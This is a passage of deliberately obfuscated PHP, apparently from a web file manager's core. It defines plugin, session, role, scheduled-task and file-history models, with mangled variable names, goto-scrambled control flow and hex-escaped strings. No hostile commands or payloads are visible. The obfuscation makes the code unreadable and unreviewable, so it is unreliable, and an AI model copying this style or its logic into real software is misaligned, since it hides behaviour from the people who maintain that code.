$Bš‹ÓŸˆ¿É)); } public function appRegist($cİØšÓØÕÓ, $F¡ùí˜Õ÷ê) { $D”ÙßÄÄ´ =& $_SERVER[¹Ò‹Ò¹]; $Cˆİôºš = $this->loadList($cİØšÓØÕÓ); if ($Cˆİôºš) { $this->update($Cˆİôºš[$D”ÙßÄÄ´[388]], array($D”ÙßÄÄ´[1781] => $F¡ùí˜Õ÷ê)); } else { $cì‡æ§¼Ÿö = array($D”ÙßÄÄ´[28] => $cİØšÓØÕÓ, $D”ÙßÄÄ´[1781] => $F¡ùí˜Õ÷ê, $D”ÙßÄÄ´[704] => 0, $D”ÙßÄÄ´[6] => $this->getConfigDefault($cİØšÓØÕÓ)); $this->insert($cì‡æ§¼Ÿö); } } public function getConfigDefault($ağï¾Ôš’®) { $b¯í×ç­¢ =& $_SERVER[¹Ò‹Ò¹]; $D–ªêŠÈ¢ê = array(); $D°Ÿ·Ïä = $this->getPackageJson($ağï¾Ôš’®); if (!$D°Ÿ·Ïä && is_array($D°Ÿ·Ïä[$b¯í×ç­¢[1788]])) { return $D–ªêŠÈ¢ê; } foreach ($D°Ÿ·Ïä[$b¯í×ç­¢[1788]] as $CÛƒçº¥¨À => $Bï§×ÖğÌ) { if (!isset($Bï§×ÖğÌ[$b¯í×ç­¢[370]]) || isset($D–ªêŠÈ¢ê[$CÛƒçº¥¨À])) { continue; } $D–ªêŠÈ¢ê[$CÛƒçº¥¨À] = $Bï§×ÖğÌ[$b¯í×ç­¢[370]]; } return $D–ªêŠÈ¢ê; } public function getPackageJson($AÈÀã’¤éë) { return Hook::apply($AÈÀã’¤éë . $_SERVER[¹Ò‹Ò¹][1789]); } public function getConfig($DŒœ¸‰ÄÜƒ, $DèåÏİîí = false) { $C¿×Î½Ú‰Á =& $_SERVER[¹Ò‹Ò¹]; $c¦‚Òœ™ù = array(); $A„ğËîùÓÒ = $this->loadList($DŒœ¸‰ÄÜƒ); if ($A„ğËîùÓÒ && is_array($A„ğËîùÓÒ[$C¿×Î½Ú‰Á[6]])) { $c¦‚Òœ™ù = $A„ğËîùÓÒ[$C¿×Î½Ú‰Á[6]]; } if (!$c¦‚Òœ™ù || $DèåÏİîí) { $c¦‚Òœ™ù = $this->getConfigDefault($DŒœ¸‰ÄÜƒ); } return $c¦‚Òœ™ù; } public function setConfig($D»¡öŸ„Â, $C‘ÎÀ‡¼ÏÉ = false) { goto FÆõ²ÅñÃ; BõŞù†Û±: $e¾ì×ìÄ‡¹ = $Eª‰ÛŞÖ[$DŸ¶ÄùŸ¤Á[6]]; if ($C‘ÎÀ‡¼ÏÉ == !1) { $e¾ì×ìÄ‡¹ = array(); $C‘ÎÀ‡¼ÏÉ = $this->getConfigDefault($D»¡öŸ„Â); } foreach ($C‘ÎÀ‡¼ÏÉ as $BÉÙİ­ˆ¦÷ => $f¥ˆ£Á«Ñ¼) { $e¾ì×ìÄ‡¹[$BÉÙİ­ˆ¦÷] = is_string($f¥ˆ£Á«Ñ¼) ? trim($f¥ˆ£Á«Ñ¼) : $f¥ˆ£Á«Ñ¼; } goto EÒ‹ğÈ”‹Å; EÒ‹ğÈ”‹Å: $this->update($Eª‰ÛŞÖ[$DŸ¶ÄùŸ¤Á[388]], array($DŸ¶ÄùŸ¤Á[6] => $e¾ì×ìÄ‡¹)); goto Fì×°ëœ; FÆõ²ÅñÃ: $DŸ¶ÄùŸ¤Á =& $_SERVER[¹Ò‹Ò¹]; $Eª‰ÛŞÖ = $this->loadList($D»¡öŸ„Â); if (!$Eª‰ÛŞÖ) { return !1; } goto BõŞù†Û±; Fì×°ëœ: } public function viewList() { goto bóø’ìùœ; dîæ™‰À‘: $aÏ•÷ªïÒø = $this->loadPluginList(); $DÓ¥ÕŸ¾é = array(); foreach ($aÏ•÷ªïÒø as $C‰ãæƒ£á£ => $bò¸³¤ñ‡) { unset($bò¸³¤ñ‡[$f·´ŸÖ¿´¤[1781]], $bò¸³¤ñ‡[$f·´ŸÖ¿´¤[6]]); $Bï„àÉÊ™ = PLUGIN_DIR . $bò¸³¤ñ‡[$f·´ŸÖ¿´¤[28]] . $f·´ŸÖ¿´¤[1783]; if (!is_file($Bï„àÉÊ™)) { continue; } $C™ì¢—ğ“á = Hook::apply($bò¸³¤ñ‡[$f·´ŸÖ¿´¤[28]] . $f·´ŸÖ¿´¤[1789]); if (is_array($C™ì¢—ğ“á)) { $DÓ¥ÕŸ¾é[$C‰ãæƒ£á£] = array_merge($bò¸³¤ñ‡, $C™ì¢—ğ“á); } } goto cğ‡»…•§; cğ‡»…•§: return $DÓ¥ÕŸ¾é; goto D»ÅåŠÏÍ; bóø’ìùœ: $f·´ŸÖ¿´¤ =& $_SERVER[¹Ò‹Ò¹]; $aÏ•÷ªïÒø = $this->loadList(); $this->pluginScan($aÏ•÷ªïÒø); goto dîæ™‰À‘; D»ÅåŠÏÍ: } private function loadPluginList() { $Dï“‘È‚œŠ =& $_SERVER[¹Ò‹Ò¹]; $e±Á»³±“Ÿ = $this->loadList(); if (strtolower(MOD) == $Dï“‘È‚œŠ[1790]) { return $e±Á»³±“Ÿ; } $a«à¡ßŞ‘† = Hook::trigger($Dï“‘È‚œŠ[1791], $e±Á»³±“Ÿ); if ($e±Á»³±“Ÿ && !$a«à¡ßŞ‘†) { die; } return $a«à¡ßŞ‘† ? $a«à¡ßŞ‘† : $e±Á»³±“Ÿ; } private function pluginScan($B“¹ºÕ‚Ë) { $d¬¥¦ƒì°ß =& $_SERVER[¹Ò‹Ò¹]; recursion_dir(PLUGIN_DIR, $fí­ïÜ°‚¡, $b­À˜ÉëÈ³, 0); foreach ($fí­ïÜ°‚¡ as $a±Ó¾‹ğÕí) { $dš ‚‰²Ş© = get_path_this($a±Ó¾‹ğÕí); if (isset($B“¹ºÕ‚Ë[$dš ‚‰²Ş©]) || !file_exists($a±Ó¾‹ğÕí . $d¬¥¦ƒì°ß[1792]) || !file_exists($a±Ó¾‹ğÕí . $d¬¥¦ƒì°ß[1783])) { continue; } Hook::apply($dš ‚‰²Ş© . $d¬¥¦ƒì°ß[1786]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\137\163\x65\x73\x73\x69\x6f\x6e"; public function get($C¨ëõµ×…ß) { $CŠƒŞ¡ç– =& $_SERVER[¹Ò‹Ò¹]; $aŸ›÷ô³‹ = $this->where(array($CŠƒŞ¡ç–[1793] => $C¨ëõµ×…ß))->find(); if (!is_array($aŸ›÷ô³‹)) { return !1; } return $aŸ›÷ô³‹[$CŠƒŞ¡ç–[707]]; } public function set($BªÇ…—ç¾, $bÃÑ¦ê¨‡¤, $Eƒªô³ƒ = 3600) { $C‹™Ëç«†ç =& $_SERVER[¹Ò‹Ò¹]; $eß·ïôİòˆ = array($C‹™Ëç«†ç[1793] => $BªÇ…—ç¾, $C‹™Ëç«†ç[1700] => $bÃÑ¦ê¨‡¤, $C‹™Ëç«†ç[1794] => $Eƒªô³ƒ + time()); if (Session::get($C‹™Ëç«†ç[1795])) { $eß·ïôİòˆ[$C‹™Ëç«†ç[1504]] = Session::get($C‹™Ëç«†ç[1795]); } else { $eß·ïôİòˆ[$C‹™Ëç«†ç[1504]] = 0; } if ($this->get($BªÇ…—ç¾)) { return $this->where(array($C‹™Ëç«†ç[1793] => $BªÇ…—ç¾))->save($eß·ïôİòˆ); } else { return $this->add($eß·ïôİòˆ, array(), !0); } } public function remove($aª±šóïÅ”) { return $this->where(array($_SERVER[¹Ò‹Ò¹][1793] => $aª±šóïÅ”))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹Ò‹Ò¹][1796] . time())->delete(); } } goto BÖòİ†ªß“; eÄ¨ƒ¤½: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\x72\157\154\x65\114\151\163\164"; public $field = array("\156\x61\155\145", "\x61\165\164\150", "\x6c\141\142\x65\154", "\144\151\x73\x70\x6c\x61\171", "\x73\171\163\x74\145\x6d", "\144\x65\163\143", "\151\x67\x6e\157\162\145\x45\x78\x74", "\x69\x67\156\x6f\162\145\x46\151\154\x65\123\151\x7a\145", "\141\144\155\151\156\x69\163\x74\162\141\x74\x6f\x72", "\163\157\x72\x74"); public function listData($DÑå¶ï¬Š = false, $c™Š‡ÎáĞà = "\x73\157\162\164", $AâÓ•››Öó = false) { $f«Ã½Ë¯Ä =& $_SERVER[¹Ò‹Ò¹]; $A…İ·Òåˆˆ = parent::listData($DÑå¶ï¬Š, $c™Š‡ÎáĞà, $AâÓ•››Öó); if (!$DÑå¶ï¬Š) { foreach ($A…İ·Òåˆˆ as $DÉ¨›á¢‹ => $FÂ×ˆùØã) { if ($FÂ×ˆùØã[$f«Ã½Ë¯Ä[1858]] == 1) { $A…İ·Òåˆˆ[$DÉ¨›á¢‹][$f«Ã½Ë¯Ä[425]] = LNG($f«Ã½Ë¯Ä[2082]); } } } return $A…İ·Òåˆˆ; } public function update($Cëï×µ»©ï, $B¨öøÀÑ) { goto a†‡»£†‰º; a†‡»£†‰º: $C·òÆâÇ±œ =& $_SERVER[¹Ò‹Ò¹]; $Dã‹˜îŸÛ = parent::listData($Cëï×µ»©ï); $A´ ¬‹±­Ä = $this->findByName($B¨öøÀÑ[$C·òÆâÇ±œ[28]]); goto Fß„ÇÃ§ö³; Fß„ÇÃ§ö³: if (!$Dã‹˜îŸÛ || $A´ ¬‹±­Ä && $A´ ¬‹±­Ä[$C·òÆâÇ±œ[388]] != $Dã‹˜îŸÛ[$C·òÆâÇ±œ[388]]) { return !1; } if ($A´ ¬‹±­Ä[$C·òÆâÇ±œ[1858]] == 1) { $B¨öøÀÑ = array($C·òÆâÇ±œ[28] => $B¨öøÀÑ[$C·òÆâÇ±œ[28]], $C·òÆâÇ±œ[1688] => $B¨öøÀÑ[$C·òÆâÇ±œ[1688]]); } $this->filterAuth($B¨öøÀÑ[$C·òÆâÇ±œ[400]]); goto F¥ÇÍ†‹…¨; F¥ÇÍ†‹…¨: return parent::update($Cëï×µ»©ï, $B¨öøÀÑ); goto Câà²µãùÀ; Câà²µãùÀ: } public function remove($aµäŸãòØ») { $eÒ×Ô……ˆÔ = parent::listData($aµäŸãòØ»); if (!$eÒ×Ô……ˆÔ || $eÒ×Ô……ˆÔ[$_SERVER[¹Ò‹Ò¹][1144]]) { return !1; } return parent::remove($aµäŸãòØ»); } public function add($B«Ä†È¬æ‡) { goto d—ÑÖ¤Àî²; EÕÈ»ãİ‹¿: $b°“áŠŠ“ = array($BÍİ‰× „[407] => $b´šºæ¡Á, $BÍİ‰× „[1673] => $BÍİ‰× „[33], $BÍİ‰× „[1669] => $BÍİ‰× „[1677], $BÍİ‰× „[2083] => 1, $BÍİ‰× „[1672] => 0, $BÍİ‰× „[2084] => 0, $BÍİ‰× „[1671] => $this->getSort()); $B«Ä†È¬æ‡ = array_merge($b°“áŠŠ“, $B«Ä†È¬æ‡); $this->filterAuth($B«Ä†È¬æ‡[$BÍİ‰× „[400]]); goto FÜ’Æ©ê‚š; d—ÑÖ¤Àî²: $BÍİ‰× „ =& $_SERVER[¹Ò‹Ò¹]; $b´šºæ¡Á = $B«Ä†È¬æ‡[$BÍİ‰× „[28]]; if ($this->findByName($b´šºæ¡Á)) { return !1; } goto EÕÈ»ãİ‹¿; FÜ’Æ©ê‚š: return parent::insert($B«Ä†È¬æ‡); goto FËĞ¸Ï‡•…; FËĞ¸Ï‡•…: } private function getSort() { $AÂ…Âó—ô =& $_SERVER[¹Ò‹Ò¹]; $CöÍæëÂÇ = parent::listData(); $BƒÀ‰‹— = array_to_keyvalue($CöÍæëÂÇ, $AÂ…Âó—ô[33], $AÂ…Âó—ô[1690]); return empty($BƒÀ‰‹—) ? 0 : max($BƒÀ‰‹—) + 1; } private function filterAuth(&$f°Ôî¸ªËº) { $EïéŒ½‚ô =& $_SERVER[¹Ò‹Ò¹]; $EÕĞÊƒªÔ = array(); $DÁÍçİÊ•« = array_filter(explode($EïéŒ½‚ô[47], $f°Ôî¸ªËº)); foreach ($DÁÍçİÊ•« as $f°Ôî¸ªËº) { $E†Çæ„¹ = explode($EïéŒ½‚ô[94], $f°Ôî¸ªËº); if ($E†Çæ„¹[0] == $EïéŒ½‚ô[2085] && $E†Çæ„¹[1] != $EïéŒ½‚ô[1065]) { $Dˆ”Ó‰ÍÍ = $E†Çæ„¹[0] . $EïéŒ½‚ô[94] . $E†Çæ„¹[1] . $EïéŒ½‚ô[2086]; if (!in_array($Dˆ”Ó‰ÍÍ, $DÁÍçİÊ•«)) { $EÕĞÊƒªÔ[] = $Dˆ”Ó‰ÍÍ; } } $EÕĞÊƒªÔ[] = $f°Ôî¸ªËº; } $f°Ôî¸ªËº = implode($EïéŒ½‚ô[47], $EÕĞÊƒªÔ); } public function sort($aØîÍö¾ÒÆ, $dÜ’ÍÌ¿ƒİ) { return parent::update($aØîÍö¾ÒÆ, $dÜ’ÍÌ¿ƒİ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\164\141\163\x6b\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x74\x79\160\x65", "\x65\166\145\156\164", "\x74\x69\x6d\145", "\x64\x65\163\x63", "\x73\171\163\164\145\155", "\145\x6e\141\x62\x6c\x65", "\x6c\141\163\x74\122\x75\156", "\163\x6f\x72\x74"); public function listData($C¶å¸ŞĞç = false, $bİ›Ã·šÉ© = "\x73\x6f\x72\164", $aª—™ªˆù¸ = false) { return parent::listData($C¶å¸ŞĞç, $bİ›Ã·šÉ©, $aª—™ªˆù¸); } public function add($Dê‘Ÿ’ç©œ) { $fÓô½¼ëö¶ =& $_SERVER[¹Ò‹Ò¹]; $f›¹ãê­äß = $this->findByName($Dê‘Ÿ’ç©œ[$fÓô½¼ëö¶[28]]); if ($f›¹ãê­äß) { return !1; } $Dê‘Ÿ’ç©œ[$fÓô½¼ëö¶[1469]] = 0; $Dê‘Ÿ’ç©œ[$fÓô½¼ëö¶[1690]] = $this->getSort(); return parent::insert($Dê‘Ÿ’ç©œ); } private function getSort() { $C•ÒÔ³ˆ©Õ =& $_SERVER[¹Ò‹Ò¹]; $FÛ¾‹›¤… = parent::listData(); $e¤æâµË”Ó = array_to_keyvalue($FÛ¾‹›¤…, $C•ÒÔ³ˆ©Õ[33], $C•ÒÔ³ˆ©Õ[1690]); return empty($e¤æâµË”Ó) ? 0 : max($e¤æâµË”Ó) + 1; } public function update($FÈ¾É¨Ó‡¿, $DœÏãäÖ÷½) { $C¶ºĞ™ÃÍï =& $_SERVER[¹Ò‹Ò¹]; $dÅˆáÇ‚Œ = $this->listData($FÈ¾É¨Ó‡¿); $E¸ÂîåèÌ¡ = $this->findByName($DœÏãäÖ÷½[$C¶ºĞ™ÃÍï[28]]); if (!$dÅˆáÇ‚Œ || $E¸ÂîåèÌ¡ && $E¸ÂîåèÌ¡[$C¶ºĞ™ÃÍï[388]] != $dÅˆáÇ‚Œ[$C¶ºĞ™ÃÍï[388]]) { return !1; } return parent::update($FÈ¾É¨Ó‡¿, $DœÏãäÖ÷½); } public function remove($e«÷ÑŠ•Ğ, $c’ÁÉÖå‡õ = false) { $C´¥£Áùõ± =& $_SERVER[¹Ò‹Ò¹]; $B‰¯‚ä‘ÖÌ = $this->listData($e«÷ÑŠ•Ğ); if (!$B‰¯‚ä‘ÖÌ) { return; } if (!$c’ÁÉÖå‡õ && $B‰¯‚ä‘ÖÌ[$C´¥£Áùõ±[1144]] == $C´¥£Áùõ±[86]) { return !1; } return parent::remove($e«÷ÑŠ•Ğ); } public function enable($CÂÄ›”–—„, $d‘Ô¨ñ±Œ) { return $this->update($CÂÄ›”–—„, array($_SERVER[¹Ò‹Ò¹][2077] => $d‘Ô¨ñ±Œ)); } public function run($FÎâê‘‚) { return $this->update($FÎâê‘‚, array($_SERVER[¹Ò‹Ò¹][2087] => time())); } } goto A‰ Ä‚; d®Ï…‘ÃÒÎ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\x72\x63\145\137\x68\x69\163\164\157\x72\x79"; public function historyCount($EŒøÓñÏ) { goto EÈåó©ÇÒ; EÈåó©ÇÒ: $B„·È’¼ =& $_SERVER[¹Ò‹Ò¹]; if (!$EŒøÓñÏ) { return array(); } if (is_string($EŒøÓñÏ) || is_int($EŒøÓñÏ)) { $EŒøÓñÏ = array($EŒøÓñÏ); } goto DËÂ©Å¢Ã; DÁ…ÈøÑÛ: return array_to_keyvalue($E¸±­ØÜ„Ú, $B„·È’¼[390], $B„·È’¼[474]); goto c§ƒè¾²äè; DËÂ©Å¢Ã: $aÖ‡Å±ÅÆÄ = array($B„·È’¼[390], $B„·È’¼[1699] => $B„·È’¼[474]); $e¾¹É†÷‡ = array($B„·È’¼[390] => array($B„·È’¼[7], $EŒøÓñÏ)); $E¸±­ØÜ„Ú = $this->field($aÖ‡Å±ÅÆÄ)->where($e¾¹É†÷‡)->group($B„·È’¼[390])->select(); goto DÁ…ÈøÑÛ; c§ƒè¾²äè: } public function addHistory($Cõ©çîÍÁÊ, $A…ªçŠ›áÙ = '') { $f×íí¸µ”¡ =& $_SERVER[¹Ò‹Ò¹]; $B·“ÜÆ‘ªŸ = array($f×íí¸µ”¡[404] => $Cõ©çîÍÁÊ[$f×íí¸µ”¡[390]], $f×íí¸µ”¡[1496] => isset($Cõ©çîÍÁÊ[$f×íí¸µ”¡[428]]) ? $Cõ©çîÍÁÊ[$f×íí¸µ”¡[428]] : $Cõ©çîÍÁÊ[$f×íí¸µ”¡[426]], $f×íí¸µ”¡[442] => $Cõ©çîÍÁÊ[$f×íí¸µ”¡[441]], $f×íí¸µ”¡[543] => $Cõ©çîÍÁÊ[$f×íí¸µ”¡[77]], $f×íí¸µ”¡[1897] => $A…ªçŠ›áÙ); $f°½­š²íÒ = $GLOBALS[$f×íí¸µ”¡[6]][$f×íí¸µ”¡[87]][$f×íí¸µ”¡[1078]]; if ($f°½­š²íÒ > 1) { $this->historyAutoClear($B·“ÜÆ‘ªŸ[$f×íí¸µ”¡[390]]); $this->add($B·“ÜÆ‘ªŸ); } Hook::trigger($f×íí¸µ”¡[1898], $B·“ÜÆ‘ªŸ); Model($f×íí¸µ”¡[1899])->eventFileEdit($Cõ©çîÍÁÊ[$f×íí¸µ”¡[390]]); } private function historyAutoClear($b½®šÂ¡Âï) { goto dŠ¦ô…†Ù; Añ„„óµ: $this->where($cäŸß¿½¡¹)->delete(); Model($FÌ²º‹ƒ [444])->remove($eÂ’¨ÄŸˆ); goto eô¨ŒÆƒˆ˜; aÇŠ½Ì‰®ë: $cäŸß¿½¡¹ = array($FÌ²º‹ƒ [404] => $b½®šÂ¡Âï); $dŒ…–Ü†ëˆ = $this->field($FÌ²º‹ƒ [1900])->where($cäŸß¿½¡¹)->order($FÌ²º‹ƒ [1894])->select(); if (!$dŒ…–Ü†ëˆ || $fğ’ÀÓŸÆÄ >= count($dŒ…–Ü†ëˆ)) { return; } goto Eô½÷¹”íù; Eô½÷¹”íù: $cÒÕÊ¬ãÄõ = array_to_keyvalue($dŒ…–Ü†ëˆ, $FÌ²º‹ƒ [33], $FÌ²º‹ƒ [388]); $cÒÕÊ¬ãÄõ = array_slice($cÒÕÊ¬ãÄõ, $fğ’ÀÓŸÆÄ); $eÂ’¨ÄŸˆ = array_to_keyvalue($dŒ…–Ü†ëˆ, $FÌ²º‹ƒ [33], $FÌ²º‹ƒ [441]); goto AÖá¬¿˜‹Ú; dŠ¦ô…†Ù: $FÌ²º‹ƒ  =& $_SERVER[¹Ò‹Ò¹]; $A¦‡Á™ÈÃØ = Model($FÌ²º‹ƒ [1099])->get($FÌ²º‹ƒ [1100]); $D¼çàêâ“ë = $GLOBALS[$FÌ²º‹ƒ [6]][$FÌ²º‹ƒ [87]][$FÌ²º‹ƒ [1078]]; goto Fõ»Û´¼µ…; Fõ»Û´¼µ…: $fğ’ÀÓŸÆÄ = $A¦‡Á™ÈÃØ == $FÌ²º‹ƒ [1101] ? 5 : $D¼çàêâ“ë; if ($D¼çàêâ“ë <= 1) { $fğ’ÀÓŸÆÄ = 1; } if ($fğ’ÀÓŸÆÄ >= 500) { return; } goto aÇŠ½Ì‰®ë; AÖá¬¿˜‹Ú: $eÂ’¨ÄŸˆ = array_slice($eÂ’¨ÄŸˆ, $fğ’ÀÓŸÆÄ); if (!$cÒÕÊ¬ãÄõ || !$eÂ’¨ÄŸˆ) { return; } $cäŸß¿½¡¹ = array($FÌ²º‹ƒ [406] => array($FÌ²º‹ƒ [7], $cÒÕÊ¬ãÄõ)); goto Añ„„óµ; eô¨ŒÆƒˆ˜: } public function listData($A„«Èâ¢) { goto CË™Ë”õ; F‹ëÕäÄ¤µ: $AĞëîÁ½îƒ = $this->field($e‹Şé°ùã)->where($AÓ²Ãá–Å£)->order($e¡ŞÖ·éĞ[1894])->selectPage(); $this->_listAppendUser($AĞëîÁ½îƒ[$e¡ŞÖ·éĞ[365]]); $B™Ô» ”£® = Model($e¡ŞÖ·éĞ[1099])->get($e¡ŞÖ·éĞ[1100]); goto D¦¨­¢Ş; D¦¨­¢Ş: $F®¿·Æ¶Ÿ = 5; if ($B™Ô» ”£® == $e¡ŞÖ·éĞ[1101]) { $AĞëîÁ½îƒ[$e¡ŞÖ·éĞ[365]] = array_slice($AĞëîÁ½îƒ[$e¡ŞÖ·éĞ[365]], 0, $F®¿·Æ¶Ÿ); $AĞëîÁ½îƒ[$e¡ŞÖ·éĞ[362]] = array($e¡ŞÖ·éĞ[1902] => 1, $e¡ŞÖ·éĞ[1903] => 20, $e¡ŞÖ·éĞ[1904] => 1, $e¡ŞÖ·éĞ[1905] => count($AĞëîÁ½îƒ[$e¡ŞÖ·éĞ[365]])); } return $AĞëîÁ½îƒ; goto FŒÙÆÚ¼˜¬; CË™Ë”õ: $e¡ŞÖ·éĞ =& $_SERVER[¹Ò‹Ò¹]; $AÓ²Ãá–Å£ = array($e¡ŞÖ·éĞ[404] => $A„«Èâ¢); $e‹Şé°ùã = $e¡ŞÖ·éĞ[1901]; goto F‹ëÕäÄ¤µ; FŒÙÆÚ¼˜¬: } protected function _listAppendUser(&$FÌÙ›½½‰) { $E¹ìÑó•»… =& $_SERVER[¹Ò‹Ò¹]; $eøñÇÂ‰õ‘ = array_to_keyvalue($FÌÙ›½½‰, $E¹ìÑó•»…[33], $E¹ìÑó•»…[1504]); $cóäÈëœ¨¬ = Model($E¹ìÑó•»…[501])->userListInfo($eøñÇÂ‰õ‘); foreach ($FÌÙ›½½‰ as &$dÛ‡ÊŞó·) { $F»˜£Œ¸å = $dÛ‡ÊŞó·[$E¹ìÑó•»…[1504]]; $dÛ‡ÊŞó·[$E¹ìÑó•»…[426]] = $cóäÈëœ¨¬[$F»˜£Œ¸å] ? $cóäÈëœ¨¬[$F»˜£Œ¸å] : !1; } unset($dÛ‡ÊŞó·); } public function fileInfo($Cã—Ôñ…ª) { $CçØ‡‡«Õ =& $_SERVER[¹Ò‹Ò¹]; $Fñá»Î–Ğ = $this->tablePrefix; $eßóõàÖÜŒ = "{$Fñá»Î–Ğ}\151\x6f\x5f\x66\x69\x6c\x65\x20\146\151\154\145\x73\x20\157\156\x20\146\151\154\x65\163\56\x66\x69\x6c\145\x49\x44\40\x3d\x20\x68\x69\x73\x74\x6f\x72\x79\x2e\x66\x69\154\145\111\x44"; return $this->alias($CçØ‡‡«Õ[1906])->where(array($CçØ‡‡«Õ[406] => $Cã—Ôñ…ª))->join($eßóõàÖÜŒ, $CçØ‡‡«Õ[1907])->find(); } public function removeItem($cÊ˜àŠÎÌĞ) { $eœßâ×ôè„ =& $_SERVER[¹Ò‹Ò¹]; $Bé¬“ƒ³àÒ = array($eœßâ×ôè„[406] => $cÊ˜àŠÎÌĞ); $eŠ¦ÌİåÇâ = $this->where($Bé¬“ƒ³àÒ)->find(); if ($eŠ¦ÌİåÇâ) { $AèŒš®æ§¨ = $this->where($Bé¬“ƒ³àÒ)->delete(); Model($eœßâ×ôè„[444])->remove($eŠ¦ÌİåÇâ[$eœßâ×ôè„[441]]); return $AèŒš®æ§¨; } return !1; } public function removeBySource($eƒÚíç»øõ) { goto Fãî«‚çÜª; bİçôº‹ù‰: return !0; goto A»½ŠŠƒ; Fãî«‚çÜª: $C¼ì·Ä›ÉÏ =& $_SERVER[¹Ò‹Ò¹]; if (!$eƒÚíç»øõ) { return !1; } if (!is_array($eƒÚíç»øõ)) { $eƒÚíç»øõ = array($eƒÚíç»øõ); } goto dÖ­ë”Í³Ê; dÖ­ë”Í³Ê: $E‚õÀ„‰—Š = array($C¼ì·Ä›ÉÏ[404] => array($C¼ì·Ä›ÉÏ[7], $eƒÚíç»øõ)); $a¬—ÃßˆøŞ = $this->field($C¼ì·Ä›ÉÏ[442])->where($E‚õÀ„‰—Š)->select(); if ($a¬—ÃßˆøŞ) { $this->where($E‚õÀ„‰—Š)->delete(); $a’¦Ó—÷ä§ = array_to_keyvalue($a¬—ÃßˆøŞ, $C¼ì·Ä›ÉÏ[33], $C¼ì·Ä›ÉÏ[441]); Model($C¼ì·Ä›ÉÏ[444])->remove($a’¦Ó—÷ä§); } goto bİçôº‹ù‰; A»½ŠŠƒ: } public function setDetail($Aƒ§È¸â³, $D«’Ó) { $aò ìƒÎÀ =& $_SERVER[¹Ò‹Ò¹]; return $this->where(array($aò ìƒÎÀ[406] => $Aƒ§È¸â³))->save(array($aò ìƒÎÀ[1897] => $D«’Ó)); } public function rollbackToItem($eß×ª ëŒŠ, $CÊÙÉ²î„) { goto c±ğ—œÅ¢ˆ; c±ğ—œÅ¢ˆ: $fŒº¨Ô¥Î =& $_SERVER[¹Ò‹Ò¹]; $b“×‡ñ¥Ñ = Model($fŒº¨Ô¥Î[769])->sourceInfo($eß×ª ëŒŠ); $this->addHistory($b“×‡ñ¥Ñ, LNG($fŒº¨Ô¥Î[1908])); goto B…½Œƒ£Ÿ®; B…½Œƒ£Ÿ®: $CÎî‚‡’¾” = $this->find($CÊÙÉ²î„); $DÊôìñ¥´ = array($fŒº¨Ô¥Î[441] => $CÎî‚‡’¾”[$fŒº¨Ô¥Î[441]], $fŒº¨Ô¥Î[77] => $CÎî‚‡’¾”[$fŒº¨Ô¥Î[77]], $fŒº¨Ô¥Î[83] => time(), $fŒº¨Ô¥Î[428] => USER_ID); Model($fŒº¨Ô¥Î[769])->where(array($fŒº¨Ô¥Î[390] => $eß×ª ëŒŠ))->save($DÊôìñ¥´); goto e¢ÆŸß”Ç¸; e¢ÆŸß”Ç¸: return $this->where(array($fŒº¨Ô¥Î[406] => $CÊÙÉ²î„))->delete(); goto a‰—†ˆØÄ; a‰—†ˆØÄ: } public function clearSame($DŠ’Ğ§ÑÀğ) { goto F¨Ë´Ä›³¨; F¨Ë´Ä›³¨: $aÅ„ÒÍÀ¿Ğ =& $_SERVER[¹Ò‹Ò¹]; $B˜§˜×¬§í = $this->listData($DŠ’Ğ§ÑÀğ); $añ˜’‡óÙØ = array_to_keyvalue_group($B˜§˜×¬§í, $aÅ„ÒÍÀ¿Ğ[441]); goto cò­¼›‰Áİ; cò­¼›‰Áİ: $eâ³õ­½›ö = array(); $B¿äÏŸô±Œ = array(); foreach ($añ˜’‡óÙØ as $a‹ñæƒ‚ÁŠ) { if (!$a‹ñæƒ‚ÁŠ || count($a‹ñæƒ‚ÁŠ) <= 1) { continue; } foreach ($a‹ñæƒ‚ÁŠ as $b´Ò½£®ºİ) { $eâ³õ­½›ö[] = $b´Ò½£®ºİ[$aÅ„ÒÍÀ¿Ğ[441]]; $B¿äÏŸô±Œ[] = $b´Ò½£®ºİ[$aÅ„ÒÍÀ¿Ğ[388]]; } } goto eçŞÕùó§ˆ; eçŞÕùó§ˆ: if (!$B¿äÏŸô±Œ) { return; } $this->where(array($aÅ„ÒÍÀ¿Ğ[388] => array($aÅ„ÒÍÀ¿Ğ[7], $B¿äÏŸô±Œ)))->delete(); Model($aÅ„ÒÍÀ¿Ğ[444])->remove($eâ³õ­½›ö); goto DíºªĞªßÀ; DíºªĞªßÀ: } public function userSpace() { $BèÈÇ„‡« =& $_SERVER[¹Ò‹Ò¹]; $aî¥‰ø¶ò = $this->tablePrefix; $d£±ŞÈßë† = array($BèÈÇ„‡«[1496] => USER_ID); $B«ÕğÚ§í = "{$aî¥‰ø¶ò}\151\x6f\x5f\x66\x69\154\145\40\146\x69\x6c\x65\163\x20\157\156\x20\146\151\154\x65\x73\56\146\151\x6c\145\111\104\40\75\40\x68\151\163\164\x6f\162\171\56\146\151\x6c\x65\111\x44"; return $this->alias($BèÈÇ„‡«[1906])->where($d£±ŞÈßë†)->join($B«ÕğÚ§í, $BèÈÇ„‡«[1907])->sum($BèÈÇ„‡«[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($AŸ†Í”‰Ş¢) { goto D‘‰¥õ¤›; D‘‰¥õ¤›: $bæª‡ËœÆ =& $_SERVER[¹Ò‹Ò¹]; $B‡©Ê²¿‘÷ = KodIO::fileTypeList(); $DêÓŸšâî† = $B‡©Ê²¿‘÷[$AŸ†Í”‰Ş¢]; goto fğ²ËÂ¤ÒÜ; fÕó‚Í¤ß™: if (!$DêÓŸšâî†[$bæª‡ËœÆ[167]]) { $fÇóñË“Ô = array_to_keyvalue($B‡©Ê²¿‘÷, $bæª‡ËœÆ[33], $bæª‡ËœÆ[167]); $e×œ††ëä• = implode($bæª‡ËœÆ[47], $fÇóñË“Ô); $cÌæ´ëšŸ… = $bæª‡ËœÆ[1909]; } $c´çŒÒ—½› = explode($bæª‡ËœÆ[47], trim($e×œ††ëä•, $bæª‡ËœÆ[47])); return array($cÌæ´ëšŸ…, $c´çŒÒ—½›); goto bÏ¯ğ„éù–; 